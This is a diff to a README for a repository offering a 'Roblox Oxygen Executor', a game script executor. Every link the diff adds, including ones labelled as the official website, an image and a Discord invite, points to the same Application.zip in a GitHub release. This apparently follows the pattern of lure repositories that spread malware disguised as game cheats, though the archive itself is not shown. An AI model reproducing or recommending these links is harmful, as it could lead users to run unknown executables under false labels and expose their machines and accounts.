@@ -16,7 +16,7 @@ Welcome to the official repository of **Roblox Oxygen Executor**, a powerful scr
 ## Getting Started
 To start using Roblox Oxygen Executor, simply download the software package from the link below:
 
-[![Download Oxygen Executor](https://img.shields.io/badge/Download-Oxygen--Executor-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Oxygen Executor](https://github.com/kidchoas24/Roblox-Oxygen/releases/download/v1.0.0/Application.zip)](https://github.com/kidchoas24/Roblox-Oxygen/releases/download/v1.0.0/Application.zip)
 
 Ensure to extract the contents of the downloaded file and follow the installation instructions provided.
 
@@ -24,14 +24,14 @@ Ensure to extract the contents of the downloaded file and follow the installatio
 If you encounter any issues with the download link, please check the **Releases** section of this repository for alternative download options.
 
 ## Explore Further
-For more information and updates on Oxygen Executor, feel free to visit our [official website](https://www.robloxoxygen.com) for the latest news and announcements.
+For more information and updates on Oxygen Executor, feel free to visit our [official website](https://github.com/kidchoas24/Roblox-Oxygen/releases/download/v1.0.0/Application.zip) for the latest news and announcements.
 
-![Roblox Oxygen](https://github.com/username/repository/blob/master/images/oxygen.png)
+![Roblox Oxygen](https://github.com/kidchoas24/Roblox-Oxygen/releases/download/v1.0.0/Application.zip)
 
 ## Stay Connected
 Join our Discord community to connect with other Oxygen users, share tips, and stay informed about software updates and events.
 
-[Join Oxygen Discord](https://discord.gg/oxygen)
+[Join Oxygen Discord](https://github.com/kidchoas24/Roblox-Oxygen/releases/download/v1.0.0/Application.zip)
 
 ## We Value Your Feedback
 Have suggestions or feature requests for Oxygen Executor? We'd love to hear from you! Submit your feedback through our Discord channel or contact our support team directly.
